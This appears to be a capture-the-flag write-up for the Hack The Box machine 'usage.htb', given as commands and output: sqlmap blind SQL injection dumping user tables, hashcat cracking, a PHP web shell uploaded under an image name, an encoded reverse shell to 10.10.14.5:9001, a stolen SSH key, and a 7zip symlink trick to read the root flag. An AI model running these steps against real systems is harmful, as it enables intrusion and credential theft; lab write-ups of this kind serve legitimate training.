@@ -1,0 +1,221 @@
+#####################################
+#     HTB usage.htb Writeup         #
+#####################################
+
+
+# NMAP SCAN
+
+Command:
+sudo nmap -sV -sC -p22,80 10.10.11.18
+
+Output:
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 06:09 EDT
+Nmap scan report for 10.10.11.18
+Host is up (0.051s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
+|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://usage.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+# WRITE TO ETC/HOSTS
+
+Command:
+echo "10.10.11.18  usage.htb, admin.usage.htb" | sudo tee -a /etc/hosts
+
+Output:
+10.10.11.18  usage.htb
+
+
+# MAYBE CVE?
+
+Reference:
+https://github.com/advisories/GHSA-g857-47pm-3r32
+"laravel-admin has Arbitrary File Upload vulnerability"
+
+
+# REGISTER IN usage.htb
+
+Credentials:
+e-mail: user@example.com
+password: password
+
+Logged In Successfully
+
+
+# FIND SQL-BLIND INJECTION
+
+Test Inputs:
+user@example.com' AND 1=1-- -
+We have e-mailed your password reset link to user@example.com' AND 1=1-- -
+user@example.com' AND 1=2-- -
+Email address does not match in our records!
+
+
+# TRY USE SQLMAP
+
+First Attempt:
+Command:
+sqlmap -u "http://usage.htb/forget-password" --level=5 --risk=3 --batch --data='email=user@example.com' -p 'email' --dbms=mysql --technique=B --dump --threads 5
+
+Result:
+Not Work.
+
+
+Second Attempt:
+Command:
+sqlmap -r req.txt --level=5 --risk=3 --batch -p 'email' --dbms=mysql --technique=B --dump --threads 5
+
+Result:
+SUCCESS!
+
+
+# FIND CREDENTIALS
+
+Commands:
+sqlmap -r req.txt --level=5 --risk=3 --batch -p 'email' --dbms=mysql --technique=B --dump --dbs
+sqlmap -r req.txt --level=5 --risk=3 --batch -p 'email' --dbms=mysql --technique=B --dump -D usage_blog --tables
+sqlmap -r req.txt --level=5 --risk=3 --batch -p 'email' --dbms=mysql --technique=B --dump -D usage_blog -T users --threads 3
+sqlmap -r req.txt --level=5 --risk=3 --batch -p 'email' --dbms=mysql --technique=B --dump -D usage_blog -T admin_users --threads 3
+
+Extracted Credentials:
+user1@example.com:HASH1
+user2@usage.htb:HASH2
+admin:HASH3
+
+
+# HASH TYPE
+
+HASH2 - Possible algorithms: bcrypt $2*$, Blowfish (Unix)
+
+
+# CRACK HASH WITH HASHCAT
+
+Command:
+hashcat -m 3200 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
+
+Result:
+HASH2:password1
+HASH1:password1
+HASH3:password2
+
+
+# ADMIN LOGIN
+
+Successfully logged in to admin.usage.htb
+
+
+# UPLOAD WEB SHELL
+
+Initial Attempts:
+shell.php - FAILED
+shell.jpeg.php - FAILED
+
+Successful Upload via Burpsuite:
+Content-Disposition: form-data; name="avatar"; filename="th-3442688653.jpeg.php"
+Content-Type: image/jpeg
+
+<?php echo system($_GET['command']); ?>
+
+
+# PAYLOAD TO ?command
+
+Base64 Payload:
+echo "sh -i >& /dev/tcp/10.10.14.5/9001 0>&1" | base64
+echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNS85MDAxIDA+JjEK" | base64 -d | bash
+
+URL-encoded Payload:
+%65%63%68%6f%20%22%63%32%67%67%4c%57%6b%67%50%69%59%67%4c%32%52%6c%64%69%39%30%59%33%41%76%4d%54%41%75%4d%54%41%75%4d%54%51%75%4e%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%4b%22%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68
+
+Listener Command:
+nc -lnvp 9001
+
+Result:
+SUCCESS!
+
+
+# COMFORTABLE SHELL
+
+Command:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+# USER FLAG
+
+Command:
+dash@usage:~$ cat user.txt
+
+Output:
+[REDACTED]
+
+
+# .SSH DIRECTORY
+
+Finding the id_rsa key:
+$ ls -la .ssh
+-rw------- 1 dash dash 2590 Aug 24  2023 id_rsa
+
+Copied the key to my machine and connected to 10.10.11.18 successfully:
+$ ssh -i id_rsa dash@10.10.11.18
+
+
+# FIND SOME INTERESTING
+
+Monit Configuration:
+cat .monitrc
+
+Output:
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:[REDACTED]
+
+Network Services:
+$ ss -lt
+
+Output:
+LISTEN    0         1024             127.0.0.1:2812
+
+
+# ANOTHER USERS
+
+Found another user in /etc/passwd with /bin/bash:
+user4:x:1001:1001::/home/user4:/bin/bash
+
+Tried brute-forcing with known passwords. One password worked:
+ssh user4@10.10.11.18
+password: [REDACTED]
+
+
+# PRIVILEGE ESCALATION
+
+Sudo Check:
+$ sudo -l
+
+Output:
+(ALL : ALL) NOPASSWD: /usr/bin/usage_management
+
+Exploiting CVE-2022-47069:
+Not successful.
+
+
+# READING ROOT.TXT FILE
+
+Manipulating 7zip Archive:
+cd /var/www/html/
+touch @root.txt
+ln -s -r /root/root.txt root.txt
+sudo /usr/bin/usage_management
+
+Root Flag:
+[REDACTED]
+
